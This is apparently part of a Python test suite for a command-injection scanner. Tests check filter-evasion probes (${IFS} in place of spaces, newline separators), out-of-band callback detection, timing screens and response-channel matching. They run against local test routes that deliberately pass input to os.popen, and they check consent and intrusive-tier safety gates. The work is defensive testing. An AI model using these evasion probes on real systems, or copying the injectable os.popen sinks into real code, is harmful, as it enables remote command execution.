                    [self.rec], url=f"{base}/x?q=FUZZ", methods=["oob"],
                    config={"oob_host": "127.0.0.1", "oob_http_port": port,
                            "oob_listener": listener, "oob_wait": 3.0})
        finally:
            listener._servers[0].shutdown()
        confirmed = [r for r in results if r["verdict"] == "confirmed"]
        if not confirmed:
            self.skipTest("no HTTP fetch tool (curl/wget) available in this environment")
        self.assertTrue(all(r["tier"] == "confirmed" for r in confirmed))

    def test_a_non_executing_sink_produces_no_callback(self):
        listener = OOBListener()
        port = listener.start_http(0).server_address[1]

        def route(method, path, params, headers, body):
            return 200, f"you searched for: {params.get('q', '')}"

        try:
            with local_target(route) as base:
                results = self.gen.run_detection(
                    [self.rec], url=f"{base}/x?q=FUZZ", methods=["oob"],
                    config={"oob_host": "127.0.0.1", "oob_http_port": port,
                            "oob_listener": listener, "oob_wait": 1.0})
        finally:
            listener._servers[0].shutdown()
        self.assertTrue(results)
        self.assertFalse([r for r in results if r["verdict"] == "confirmed"])


class ProbeRoundsTestCase(unittest.TestCase):
    """An aggregate method may answer with a further probe batch once it has
    seen the first — screening cheaply before paying for an expensive
    measurement. The engine bounds the rounds so a method cannot drive it
    forever against a live target."""

    def test_rounds_are_bounded(self):
        self.assertGreaterEqual(RCEKit.MAX_PROBE_ROUNDS, 2)

        class Endless(rcekit.DetectionMethod):
            name = "endless"
            aggregate = True
            rounds = 0

            def applicable(self, record):
                return True

            def build_probes(self, record, rng):
                return [Probe(payload="x", expected="")]

            def next_probes(self, series):
                Endless.rounds += 1
                return [Probe(payload=f"x{Endless.rounds}", expected="")]

            def confirm_series(self, series):
                return Verdict("negative", f"{len(series)} probes fired")

        gen = RCEKit()
        rcekit.DETECTION_METHODS["endless"] = Endless
        try:
            def route(method, path, params, headers, body):
                return 200, "ok"

            with local_target(route) as base:
                results = gen.run_detection(
                    [make_record(environment="unix", context="raw")],
                    url=f"{base}/x?q=FUZZ", methods=["endless"],
                    config={"contexts_explicit": True})
        finally:
            del rcekit.DETECTION_METHODS["endless"]
        self.assertEqual(len(results), 1)
        self.assertIn(f"{RCEKit.MAX_PROBE_ROUNDS} probes fired", results[0]["detail"])


class SpaceFilterTestCase(unittest.TestCase):
    """Stripping spaces is a filter of the same family as stripping ';' — it
    looks like it disarms command injection and does not, because `${IFS}` is a
    space as far as the shell is concerned. Every other probe carries a space,
    so before this a target exploitable by anyone who has met the filter
    reported clean unless the operator thought to pass `--evade low`."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def _payloads(self, config=None):
        import random as _random
        method = ReflectedMath(self.gen, config or {})
        return [p.payload for p in method.build_probes(self.rec, _random.Random(1))]

    def test_a_space_free_probe_is_sent_by_default(self):
        space_free = [p for p in self._payloads() if " " not in p]
        self.assertTrue(space_free, "every probe carries a space, so a space filter blocks all")
        self.assertTrue(all("${IFS}" in p for p in space_free), space_free)

    def test_the_separator_loses_its_trailing_space_too(self):
        # "; echo…" would reintroduce the very character the sink strips. No
        # shell needs the space after ';' or '&&'.
        for payload in (p for p in self._payloads() if "${IFS}" in p):
            with self.subTest(payload=payload):
                self.assertNotIn(" ", payload)

    def test_the_newline_separator_survives_the_space_free_shape(self):
        # A newline is not a space, so a space-stripping sink passes it through.
        self.assertTrue(any(p.startswith("\n") and "${IFS}" in p for p in self._payloads()))

    def test_quick_depth_still_sends_the_space_free_shape(self):
        # It costs one shape and closes a whole filter class, so it is not part
        # of the depth trade-off.
        self.assertTrue([p for p in self._payloads({"probe_depth": "quick"}) if " " not in p])

    def test_evade_low_does_not_duplicate_it(self):
        # --evade low already applies ${IFS} to every probe, so the dedicated
        # variant would be a second copy of probes that are already space-free.
        payloads = self._payloads({"evade": "low"})
        self.assertTrue(all("${IFS}" in p for p in payloads))
        self.assertEqual(len(payloads), len(set(payloads)))

    def test_the_expected_value_is_still_unforgeable(self):
        import random as _random
        for probe in ReflectedMath(self.gen, {}).build_probes(self.rec, _random.Random(5)):
            with self.subTest(payload=probe.payload):
                self.assertNotIn(probe.expected, probe.payload)

    def test_a_space_filtering_sink_is_confirmed_with_no_flags(self):
        import os

        def route(method, path, params, headers, body):
            query = params.get("q", "").replace(" ", "")
            pipe = os.popen("echo probing " + query + " 2>/dev/null")
            out = pipe.read()
            pipe.close()
            return 200, out

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["reflected"])
        self.assertTrue([r for r in results if r["verdict"] == "confirmed"])

    def test_a_space_filtering_sink_that_is_inert_stays_negative(self):
        def route(method, path, params, headers, body):
            return 200, "you searched for: " + params.get("q", "").replace(" ", "")

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["reflected"])
        self.assertTrue(results)
        self.assertFalse([r for r in results if r["verdict"] == "confirmed"])


class BlindSinkAdviceTestCase(unittest.TestCase):
    """A sink that returns no output cannot be confirmed by a results-based
    method — there is nowhere for the computed value to appear. That is what
    'blind' means, not a limitation to route around. But a run that only says
    "no execution confirmed" reads exactly like a clean target."""

    class _Args:
        def __init__(self, webroot=None, web_base_url=None):
            self.webroot = webroot
            self.web_base_url = web_base_url

    def test_in_band_only_runs_get_the_advice(self):
        lines = rcekit.blind_sink_advice(["reflected", "eval"], self._Args())
        self.assertTrue(lines)
        joined = "\n".join(lines)
        for method in ("--methods oob", "--methods file", "--methods time"):
            with self.subTest(method=method):
                self.assertIn(method, joined)

    def test_it_says_a_negative_does_not_rule_out_execution(self):
        joined = "\n".join(rcekit.blind_sink_advice(["reflected"], self._Args()))
        self.assertIn("does not rule out execution", joined)

    def test_the_suggested_oob_command_is_one_the_tool_will_accept(self):
        # oob is gated on the intrusive tier, so advice that omitted the flag
        # would name a command the tool then refuses to run.
        joined = "\n".join(rcekit.blind_sink_advice(["reflected"], self._Args()))
        oob_line = next(line for line in joined.splitlines() if "--methods oob" in line)
        self.assertIn("--oob-host", oob_line)
        self.assertIn("--verify-active-risk intrusive", oob_line)

    def test_a_blind_capable_method_already_ran_so_no_advice(self):
        for methods in (["oob"], ["time"], ["file"], ["reflected", "oob"],
                        ["reflected", "eval", "time"]):
            with self.subTest(methods=methods):
                self.assertEqual(rcekit.blind_sink_advice(methods, self._Args()), [])

    def test_no_methods_at_all_gets_no_advice(self):
        self.assertEqual(rcekit.blind_sink_advice([], self._Args()), [])

    def test_the_file_line_is_dropped_once_a_web_root_is_known(self):
        args = self._Args(webroot="/var/www/html", web_base_url="https://t")
        joined = "\n".join(rcekit.blind_sink_advice(["reflected"], args))
        self.assertNotIn("--webroot DIR", joined)
        self.assertIn("--methods oob", joined)

    def test_time_is_marked_as_needs_review_only(self):
        joined = "\n".join(rcekit.blind_sink_advice(["reflected"], self._Args()))
        self.assertRegex(joined, r"--methods time.*needs-review only")


class BlindSinkAdviceCLITestCase(unittest.TestCase):
    """The advice has to reach the operator through the real CLI, and only when
    it applies."""

    def _detect(self, route, *extra):
        with local_target(route) as base:
            return subprocess.run(
                [sys.executable, str(SCRIPT), "--acknowledge-consent",
                 "--verify-url", f"{base}/x?q=FUZZ", "--environments", "unix",
                 "--contexts", "raw", "--categories", "basic_enum", *extra],
                capture_output=True, text=True, timeout=300)

    def test_a_blind_sink_is_told_what_would_reach_it(self):
        import os

        def route(method, path, params, headers, body):
            pipe = os.popen("echo probing " + params.get("q", "") + " >/dev/null 2>&1")
            pipe.read()
            pipe.close()
            return 200, "queued"

        result = self._detect(route, "--methods", "reflected,eval")
        self.assertIn("NO OUTPUT", result.stdout)
        self.assertIn("--methods oob", result.stdout)

    def test_a_confirmed_run_is_not_lectured(self):
        import os

        def route(method, path, params, headers, body):
            pipe = os.popen("echo probing " + params.get("q", "") + " 2>/dev/null")
            out = pipe.read()
            pipe.close()
            return 200, out

        result = self._detect(route, "--methods", "reflected")
        self.assertIn("CONFIRMED execution", result.stdout)
        self.assertNotIn("NO OUTPUT", result.stdout)


class QuoteWrappingContextTestCase(unittest.TestCase):
    """A context that opens *and* closes with the same quote puts the payload
    inside it, so a probe body carrying that quote closes it early and the rest
    is no longer a command. Those probes cost a request and can only ever come
    back negative."""

    def setUp(self):
        self.gen = RCEKit()

    def _payloads(self, context):
        import random as _random
        return [p.payload for p in ReflectedMath(self.gen, {}).build_probes(
            make_record(environment="unix", context=context), _random.Random(1))]

    def test_the_quote_carrying_shape_is_not_sent_into_a_wrapping_context(self):
        self.assertFalse([p for p in self._payloads("attribute") if "awk" in p])

    def test_the_quote_free_shapes_still_are(self):
        payloads = self._payloads("attribute")
        self.assertTrue(payloads)
        self.assertTrue([p for p in payloads if "$((" in p])
        self.assertTrue([p for p in payloads if "${IFS}" in p])

    def test_a_break_out_context_still_gets_it(self):
        # shell_double_quoted CLOSES the sink's quote and comments its tail, so
        # quotes in the body are fine there — the opposite case, and it must not
        # be caught by the same guard.
        self.assertTrue([p for p in self._payloads("shell_double_quoted") if "awk" in p])

    def test_raw_is_untouched(self):
        self.assertTrue([p for p in self._payloads("raw") if "awk" in p])

    def test_the_guard_only_applies_to_verbatim_contexts(self):
        # Where an escape rule applies, the quote belongs to the serialization
        # layer and what the sink sees depends on the parser in between.
        method = ReflectedMath(self.gen, {})
        yaml_record = make_record(environment="unix", context="yaml")
        self.assertFalse(method._context_swallows(yaml_record, 'awk "x"'))
        attr_record = make_record(environment="unix", context="attribute")
        self.assertTrue(method._context_swallows(attr_record, 'awk "x"'))
        self.assertFalse(method._context_swallows(attr_record, "echo x"))

    def test_detection_is_unchanged_by_the_guard(self):
        # The removed probes were the ones that could never confirm, so a real
        # sink must still be confirmed in exactly the contexts it was before.
        import os

        def route(method, path, params, headers, body):
            pipe = os.popen("echo probing " + params.get("q", "") + " 2>/dev/null")
            out = pipe.read()
            pipe.close()
            return 200, out

        with local_target(route) as base:
            results = self.gen.run_detection(
                [make_record(environment="unix", context="attribute")],
                url=f"{base}/x?q=FUZZ", methods=["reflected"])
        self.assertTrue([r for r in results if r["verdict"] == "confirmed"])


class OobWaitTestCase(unittest.TestCase):
    """The callback window is only worth paying while a callback is plausible.
    Callbacks land in a burst once the channel works, so a target that has not
    produced a single one across every probe fired so far is not going to."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def _method(self, listener, wait=3.0):
        return rcekit.OobCallback(self.gen, {"oob_host": "x.example",
                                             "oob_listener": listener, "oob_wait": wait})

    def test_the_first_carrier_gets_the_full_window(self):
        import time as _time
        listener = OOBListener()
        method = self._method(listener, wait=1.0)
        import random as _random
        probes = method.build_probes(self.rec, _random.Random(1))[:1]
        series = [(probes[0], Observation(status=200, body="ok"))]
        started = _time.time()
        method.confirm_each(series)
        self.assertGreaterEqual(_time.time() - started, 0.9)

    def test_later_carriers_are_cut_short_when_nothing_ever_called_back(self):
        import time as _time
        listener = OOBListener()
        method = self._method(listener, wait=30.0)
        method._waited_once = True
        import random as _random
        probes = method.build_probes(self.rec, _random.Random(1))[:1]
        series = [(probes[0], Observation(status=200, body="ok"))]
        started = _time.time()
        method.confirm_each(series)
        self.assertLess(_time.time() - started, 5.0)

    def test_a_live_channel_still_gets_the_full_window(self):
        # One hit anywhere means callbacks are flowing, so later carriers must
        # not be cut short.
        import time as _time
        listener = OOBListener()
        listener.record("http", "10.0.0.9", "somewhere", "/earlier-token")
        method = self._method(listener, wait=1.0)
        method._waited_once = True
        import random as _random
        probes = method.build_probes(self.rec, _random.Random(1))[:1]
        series = [(probes[0], Observation(status=200, body="ok"))]
        started = _time.time()
        method.confirm_each(series)
        self.assertGreaterEqual(_time.time() - started, 0.9)

    def test_cutting_the_wait_short_never_changes_a_verdict_that_had_arrived(self):
        listener = OOBListener()
        method = self._method(listener, wait=30.0)
        method._waited_once = True
        import random as _random
        probes = method.build_probes(self.rec, _random.Random(1))[:2]
        listener.record("dns", "10.0.0.9", f"{probes[0].expected}.x.example")
        series = [(p, Observation(status=200, body="ok")) for p in probes]
        verdicts = {p.payload: v.status for p, v in method.confirm_each(series)}
        self.assertEqual(verdicts[probes[0].payload], "confirmed")
        self.assertEqual(verdicts[probes[1].payload], "negative")


class OobSafetyGateTestCase(unittest.TestCase):
    """Detection methods build their own probes and so bypass every corpus-level
    safety filter. That was harmless while every method was inert, but `oob`
    makes the target open outbound connections — and the run printed 'pass
    --verify-active-risk intrusive to also fire ... OOB' and then fired OOB
    anyway, so the tier the operator chose did not mean what it said."""

    def _run(self, *extra):
        return subprocess.run(
            [sys.executable, str(SCRIPT), "--acknowledge-consent",
             "--verify-url", "http://127.0.0.1:9/x?q=FUZZ", "--environments", "unix",
             "--contexts", "raw", "--categories", "basic_enum",
             "--methods", "oob", "--oob-host", "oob.example.com", *extra],
            capture_output=True, text=True, timeout=300)

    def test_the_default_tier_refuses_and_exits_non_zero(self):
        result = self._run()
        self.assertEqual(result.returncode, 1, result.stdout)
        self.assertIn("--verify-active-risk intrusive", result.stdout)

    def test_the_refusal_happens_before_the_listener_starts(self):
        # Binding a port and telling the operator the listener is up, only to
        # refuse afterwards, would be its own small lie.
        result = self._run()
        self.assertNotIn("OOB listener up", result.stdout)

    def test_intrusive_allows_it(self):
        result = self._run("--verify-active-risk", "intrusive",
                           "--listen-http-port", "0")
        self.assertIn("OOB listener up", result.stdout)

    def test_the_plan_no_longer_contradicts_the_run(self):
        # The 'held back ... and OOB' line is printed only at the safe tier, and
        # the safe tier now refuses, so the two can never appear together.
        allowed = self._run("--verify-active-risk", "intrusive", "--listen-http-port", "0")
        self.assertNotIn("low-impact (safe) payloads only", allowed.stdout)
        refused = self._run()
        self.assertNotIn("[detect] sent", refused.stdout)

    def test_other_methods_are_unaffected_by_the_gate(self):
        result = subprocess.run(
            [sys.executable, str(SCRIPT), "--acknowledge-consent",
             "--verify-url", "http://127.0.0.1:9/x?q=FUZZ", "--environments", "unix",
             "--contexts", "raw", "--categories", "basic_enum", "--methods", "reflected"],
            capture_output=True, text=True, timeout=300)
        self.assertEqual(result.returncode, 0, result.stdout)


class OobChannelWarningTestCase(unittest.TestCase):
    """A DNS callback travels the real resolver hierarchy, so it only arrives if
    this listener is the authority for the OOB domain — port 53 plus NS
    delegation. On any other port the DNS probes are still sent and can never
    call back, and the startup line said `DNS :5335` with no hint of it."""

    class _Args:
        def __init__(self, oob_host="oob.example.com", listen_dns_port=5335):
            self.oob_host = oob_host
            self.listen_dns_port = listen_dns_port

    def test_a_non_standard_dns_port_is_called_out(self):
        lines = rcekit.oob_channel_warnings(self._Args(), dns_up=True)
        self.assertTrue(lines)
        self.assertIn("port 53", lines[0])
        self.assertIn("--listen-dns-port 53", lines[0])

    def test_port_53_with_a_domain_is_silent(self):
        self.assertEqual(
            rcekit.oob_channel_warnings(self._Args(listen_dns_port=53), dns_up=True), [])

    def test_a_failed_dns_bind_is_called_out(self):
        lines = rcekit.oob_channel_warnings(self._Args(listen_dns_port=53), dns_up=False)
        self.assertTrue(lines)
        self.assertIn("cannot call back", lines[0])

    def test_an_ip_host_has_no_dns_probes_to_warn_about(self):
        # With an address literal the token rides in the URL path and no DNS
        # shape is ever built, so there is nothing to warn about.
        for host in ("10.0.0.1", "127.0.0.1"):
            with self.subTest(host=host):
                self.assertEqual(
                    rcekit.oob_channel_warnings(self._Args(oob_host=host), dns_up=False), [])

    def test_the_warning_reaches_the_operator(self):
        result = subprocess.run(
            [sys.executable, str(SCRIPT), "--acknowledge-consent",
             "--verify-url", "http://127.0.0.1:9/x?q=FUZZ", "--environments", "unix",
             "--contexts", "raw", "--categories", "basic_enum", "--methods", "oob",
             "--oob-host", "oob.example.com", "--verify-active-risk", "intrusive",
             "--listen-http-port", "0"],
            capture_output=True, text=True, timeout=300)
        self.assertIn("DNS probes cannot call back", result.stdout)


class TimingScreenDepthTestCase(unittest.TestCase):
    """`--probe-depth quick` trades probe *shapes* for requests. Narrowing the
    timing screen to the first separator looked like the same kind of saving and
    was not: it put back the ';'-only blind spot the screen exists to remove, so
    a sink that merely filters ';' reported negative — silently, and only for the
    operator who chose 'quick' to be gentle on a rate-limited target."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def _separators(self, depth):
        """Every separator the screen tries, across all of its waves."""
        import random as _random
        method = ParametricTime(self.gen, {"time_base": 1.0, "probe_depth": depth})
        series, batch, seen = [], method.build_probes(self.rec, _random.Random(1)), set()
        while batch and not any(p.phase == "regress" for p in batch):
            seen |= {p.separator for p in batch}
            # Nothing breaks out, so the screen keeps widening until exhausted.
            series += [(p, Observation(status=200, body="", elapsed=0.1)) for p in batch]
            batch = method.next_probes(series)
        return seen

    def test_both_depths_screen_every_separator(self):
        expected = {"; ", "| ", "|| ", "&& ", "\n"}
        self.assertEqual(self._separators("quick"), expected)
        self.assertEqual(self._separators("full"), expected)

    def test_the_two_depths_screen_identically(self):
        self.assertEqual(self._separators("quick"), self._separators("full"))

    def test_an_explicit_separator_list_still_narrows_it(self):
        # Cutting the request count by naming the sink's shape stays available;
        # it is just no longer a silent side effect of --probe-depth.
        import random as _random
        probes = ParametricTime(
            self.gen, {"time_base": 1.0, "separators": ["| "]}).build_probes(
            self.rec, _random.Random(1))
        self.assertEqual({p.separator for p in probes}, {"| "})


class ResponseChannelTestCase(unittest.TestCase):
    """The computed value is looked for in every channel of the response, not the
    body alone.

    A sink whose output lands in a debug header, a Set-Cookie, a redirect target,
    an HTTP reason phrase or a leaf of a JSON error envelope is a genuinely
    vulnerable target that the body-only matcher reported as `negative`. These
    lock in that the sweep finds it, that the control differential still governs
    the verdict, and that widening the search did not open a false-positive path
    through numeric transport headers."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")
        self.method = ReflectedMath(self.gen)

    def _probe(self, seed=11):
        import random as _random
        return self.method.build_probes(self.rec, _random.Random(seed))[0]

    # -- channel construction ------------------------------------------------

    def test_body_is_always_the_first_channel(self):
        # Order matters for the evidence line: the common case must keep naming
        # no channel at all, which only holds if the body is searched first.
        channels = self.gen._response_channels([("X-Debug", "v")], "hello")
        self.assertEqual(channels[0], ("response body", "hello"))

    def test_application_headers_and_cookie_values_become_channels(self):
        channels = dict(self.gen._response_channels(
            [("X-Debug-Result", "42"), ("Set-Cookie", "last=99; Path=/; HttpOnly")], ""))
        self.assertEqual(channels["header X-Debug-Result"], "42")
        self.assertEqual(channels["header Set-Cookie"], "last=99; Path=/; HttpOnly")
        # The cookie's value is also exposed on its own, so evidence can name the
        # cookie rather than the whole Set-Cookie line.
        self.assertEqual(channels["cookie last"], "99")

    def test_transport_headers_are_excluded(self):
        # Content-Length and friends are generated by the transport layer, never
        # by the application. Searching them would let a bare arithmetic result
        # collide with a byte count and confirm an execution that never happened.
        channels = dict(self.gen._response_channels(
            [("Content-Length", "417"), ("Date", "Mon, 1 Jan 2035 00:00:00 GMT"),
             ("ETag", "12345"), ("Server", "nginx")], ""))
        for absent in ("header Content-Length", "header Date", "header ETag"):
            self.assertNotIn(absent, channels)
        self.assertIn("header Server", channels)

    def test_reason_phrase_and_redirect_target_become_channels(self):
        channels = dict(self.gen._response_channels(
            [], "", reason="Internal Server Error",
            final_url="http://t/landed?x=1", requested_url="http://t/start"))
        self.assertEqual(channels["reason phrase"], "Internal Server Error")
        self.assertEqual(channels["redirect target"], "http://t/landed?x=1")

    def test_redirect_channel_is_absent_when_no_redirect_happened(self):
        channels = dict(self.gen._response_channels(
            [], "", final_url="http://t/same", requested_url="http://t/same"))
        self.assertNotIn("redirect target", channels)

    def test_json_leaves_are_addressed_by_path(self):
        body = json.dumps({"error": {"detail": "cannot render 2058898001"},
                           "items": [{"v": 7}], "ok": False, "none": None})
        channels = dict(self.gen._json_leaf_channels(body))
        self.assertEqual(channels["JSON field error.detail"], "cannot render 2058898001")
        self.assertEqual(channels["JSON field items[0].v"], "7")
        # Booleans and nulls carry no computed value, so they are not channels.
        self.assertNotIn("JSON field ok", channels)
        self.assertNotIn("JSON field none", channels)

    def test_json_leaf_channel_decodes_escaped_values(self):
        # A value the encoder escaped is invisible to a substring search of the
        # serialised body; parsing first is what makes it findable.
        body = r'{"msg": "id=20\u0035\u0038"}'
        self.assertNotIn("2058", body)
        self.assertIn(("JSON field msg", "id=2058"), self.gen._json_leaf_channels(body))

    def test_non_json_body_yields_no_leaf_channels(self):
        self.assertEqual(self.gen._json_leaf_channels("<html>not json</html>"), [])

    def test_deeply_nested_json_costs_a_channel_not_the_request(self):
        # json.loads' scanner recurses in C and raises RecursionError on a deeply
        # nested body. Channels are built inside the delivery try/except, so an
        # escaping exception would report a response that arrived perfectly well
        # as a failed request -- letting a target hide a live sink behind a
        # thousand nested arrays. Losing the JSON leaves is the acceptable cost;
        # losing the response is not.
        deep = "[" * 2000 + '"x"' + "]" * 2000
        # Assert the premise, so this test cannot quietly stop exercising the
        # recursion path if a future interpreter raises the limit.
        with self.assertRaises(RecursionError):
            json.loads(deep)
        self.assertEqual(self.gen._json_leaf_channels(deep), [])
        channels = self.gen._response_channels([("X-Debug", "v")], deep)
        self.assertEqual(channels[0], ("response body", deep))
        self.assertIn(("header X-Debug", "v"), channels)

    def test_leaf_walk_is_bounded_by_depth_and_count(self):
        nested = json.dumps({"a": {"b": {"c": "deep"}}})
        self.assertEqual(self.gen._json_leaf_channels(nested, max_depth=1), [])
        self.assertTrue(self.gen._json_leaf_channels(nested, max_depth=8))
        wide = json.dumps({"k%d" % i: i for i in range(50)})
        self.assertEqual(len(self.gen._json_leaf_channels(wide, limit=10)), 10)

    def test_channel_construction_never_turns_a_response_into_an_error(self):
        # Belt and braces for the same failure mode: whatever goes wrong while
        # building channels, a delivered response keeps its body channel.
        class Hostile:
            reason = "OK"
            url = "http://t/x"

            @property
            def headers(self):
                raise RuntimeError("boom")

        self.assertEqual(self.gen._channels_from_response(Hostile(), "hello", "http://t/x")[0],
                         ("response body", "hello"))

    # -- verdicts ------------------------------------------------------------

    def test_confirms_a_value_carried_only_by_a_header(self):
        probe = self._probe()
        obs = Observation(200, "nothing here", control_body="idle",
                          channels=[("response body", "nothing here"),
                                    ("header X-Debug-Result", f"out={probe.expected}")],
                          control_channels=[("response body", "idle")])
        verdict = self.method.confirm(obs, probe)
        self.assertEqual(verdict.status, "confirmed")
        # Reproducible by hand: the evidence must say where to look.
        self.assertIn("header X-Debug-Result", verdict.evidence)

    def test_body_match_evidence_is_unchanged(self):
        # Widening the search must not change what a body-carried confirmation
        # reads like in a report.
        probe = self._probe()
        verdict = self.method.confirm(
            Observation(200, f"out {probe.expected}", control_body="idle"), probe)
        self.assertEqual(verdict.status, "confirmed")
        self.assertNotIn(" in ", verdict.evidence.split("(")[0])

    def test_confirms_a_value_nested_in_a_json_error_envelope(self):
        import random as _random
        probe = EvalExpr(self.gen).build_probes(self.rec, _random.Random(3))[0]
        body = json.dumps({"error": {"detail": f"evaluated to {probe.expected}"}})
        channels = ([("response body", body)]
                    + self.gen._json_leaf_channels(body))
        verdict = EvalExpr(self.gen).confirm(
            Observation(500, body, control_body="{}", channels=channels,
                        control_channels=[("response body", "{}")]), probe)
        self.assertEqual(verdict.status, "confirmed")

    def test_control_carrying_the_value_in_any_channel_blocks_confirmation(self):
        # Invariant: `confirmed` requires the value to be absent from the
        # payload-free control. A control that already carries it means the value
        # is not attributable to execution, wherever it surfaced.
        probe = self._probe()
        obs = Observation(200, "nothing", control_body="idle",
                          channels=[("response body", "nothing"),
                                    ("header X-Echo", probe.expected)],
                          control_channels=[("response body", "idle"),
                                            ("header X-Echo", probe.expected)])
        verdict = self.method.confirm(obs, probe)
        self.assertEqual(verdict.status, "inconclusive")
        self.assertIn("header X-Echo", verdict.evidence)

    def test_value_absent_from_every_channel_stays_negative(self):
        probe = self._probe()
        obs = Observation(200, "nothing", control_body="idle",
                          channels=[("response body", "nothing"),
                                    ("header X-Debug", "unrelated")],
                          control_channels=[("response body", "idle")])
        self.assertEqual(self.method.confirm(obs, probe).status, "negative")

    def test_a_numeric_transport_header_cannot_confirm(self):
        # The `expr` probe's expected value is a bare boundary-fenced number, and
        # Content-Length is a bare number too. Excluding transport headers is what
        # keeps that collision from reading as execution.
        import random as _random
        probe = next(p for p in self.method.build_probes(self.rec, _random.Random(21))
                     if p.boundary)
        channels = self.gen._response_channels(
            [("Content-Length", probe.expected)], "nothing here")
        verdict = self.method.confirm(
            Observation(200, "nothing here", control_body="idle", channels=channels,
                        control_channels=[("response body", "idle")]), probe)
        self.assertEqual(verdict.status, "negative")

    def test_channels_default_to_the_body_when_absent(self):
        # An Observation built from a body alone must behave exactly as it did
        # before channels existed.
        probe = self._probe()
        self.assertEqual(
            self.method.confirm(
                Observation(200, f"x {probe.expected} y", control_body="idle"), probe).status,
            "confirmed")

    def test_file_method_control_differential_covers_every_channel(self):
        import random as _random
        fb = FileBased(self.gen, {"webroot": "/var/www", "web_base_url": "http://t"})
        probe = fb.build_probes(self.rec, _random.Random(4))[0]
        obs = Observation(200, "ok", followup_body=probe.expected,
                          control_channels=[("response body", "idle"),
                                            ("header X-Echo", probe.expected)])
        self.assertEqual(fb.confirm(obs, probe).status, "inconclusive")

    # -- end to end ----------------------------------------------------------

    def test_header_only_sink_confirms_end_to_end(self):
        # The whole point, against a real socket: a sink that puts command output
        # in a response header and nothing in the body used to report `negative`.
        import os

        def route(method, path, params, headers, body):
            pipe = os.popen("echo " + params.get("host", "") + " 2>&1")
            out = pipe.read()
            pipe.close()
            return 200, "<html>no output here</html>", [("X-Cmd-Out", out.replace("\n", " "))]

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/hdr?host=FUZZ", methods=["reflected"])
        confirmed = [r for r in results if r["verdict"] == "confirmed"]
        self.assertTrue(confirmed, "a header-only sink must confirm")
        self.assertTrue(any("header X-Cmd-Out" in r["detail"] for r in confirmed))

    def test_non_2xx_body_still_confirms_end_to_end(self):
        # Many evaluators surface the computed value only in a 500 stack trace.
        # An early exit on status would suppress that whole class silently.
        import os

        def route(method, path, params, headers, body):
            pipe = os.popen("echo " + params.get("host", "") + " 2>&1")
            out = pipe.read()
            pipe.close()
            return 500, "Traceback: rendering failed\n" + out

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/err?host=FUZZ", methods=["reflected"])
        self.assertTrue([r for r in results if r["verdict"] == "confirmed"],
                        "a 500 response carrying the computed value must confirm")

    def test_deeply_nested_json_does_not_silence_detection_end_to_end(self):
        # The evasion this guards against: a target that buries its response in
        # deep JSON would make every probe report `error` -- "never reached the
        # target" -- and a live sink would read as untestable.
        import os

        nesting = 2000
        with self.assertRaises(RecursionError):
            json.loads("[" * nesting + '"x"' + "]" * nesting)

        def route(method, path, params, headers, body):
            pipe = os.popen("echo " + params.get("host", "") + " 2>&1")
            out = pipe.read()
            pipe.close()
            return 200, "[" * nesting + json.dumps(out) + "]" * nesting

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/deep?host=FUZZ", methods=["reflected"])
        self.assertFalse([r for r in results if r["verdict"] == "error"],
                         "a delivered response must never be reported as a delivery failure")
        self.assertTrue([r for r in results if r["verdict"] == "confirmed"],
                        "the body channel still carries the computed value")

    def test_a_clean_target_stays_negative_across_all_channels(self):
        # False-positive resistance, restated for the wider sweep: a target that
        # never executes anything must not confirm through any channel.
        def route(method, path, params, headers, body):
            return 200, "<html>static page 12345678</html>", [
                ("X-Request-Id", "abc-123"), ("Set-Cookie", "sid=deadbeef; Path=/")]

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/safe?host=FUZZ", methods=["reflected", "eval"])
        self.assertFalse([r for r in results if r["verdict"] == "confirmed"],
                         "a non-executing target must not confirm through any channel")


if __name__ == "__main__":
    unittest.main()
